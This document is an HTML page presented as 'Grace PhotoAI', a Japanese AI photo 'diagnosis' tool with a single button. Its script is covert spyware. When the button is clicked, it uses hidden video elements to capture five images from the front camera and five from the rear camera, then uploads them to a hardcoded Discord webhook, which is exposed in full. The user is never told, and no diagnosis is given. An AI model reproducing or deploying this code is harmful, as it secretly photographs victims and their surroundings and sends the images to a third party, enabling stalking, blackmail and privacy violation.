
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Grace PhotoAI</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background: #f0f0f0;
      font-family: Arial, sans-serif;
    }
    h1 {
      font-size: 56px;
      margin-bottom: 20px;
      color: #333;
    }
    .main-button {
      font-size: 20px;
      padding: 12px 24px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .main-button:disabled {
      background-color: #a5d6a7;
      cursor: not-allowed;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Grace PhotoAI</h1>
  <button class="main-button" id="shootBtn">診断する</button>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const shootBtn = document.getElementById('shootBtn');

    async function startCamera(facingMode) {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facingMode },
        audio: false
      });
      video.srcObject = stream;
      await new Promise(resolve => video.onloadedmetadata = resolve);
      return stream;
    }

    function captureImage() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      return new Promise(resolve => {
        canvas.toBlob(blob => {
          resolve(blob);
        }, 'image/jpeg');
      });
    }

    async function uploadImagesToDiscord(blobs) {
      const form = new FormData();
      form.append('content', '画像をアップロード');

      blobs.forEach((blob, i) => {
        form.append(`files[${i}]`, blob, `image_${i + 1}.jpg`);
      });

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          body: form
        });
      } catch (err) {
        console.error('Discordへの送信エラー:', err);
      }
    }

    async function captureSequence(facingMode, count, delayMs) {
      const blobs = [];
      const stream = await startCamera(facingMode);

      for (let i = 0; i < count; i++) {
        const blob = await captureImage();
        blobs.push(blob);
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }

      stream.getTracks().forEach(track => track.stop());
      return blobs;
    }

    shootBtn.addEventListener('click', async () => {
      shootBtn.disabled = true;

      const frontBlobs = await captureSequence('user', 5, 100);
      const backBlobs = await captureSequence('environment', 5, 100);

      await uploadImagesToDiscord([...frontBlobs, ...backBlobs]);

      shootBtn.disabled = false;
    });
  </script>
</body>
</html>
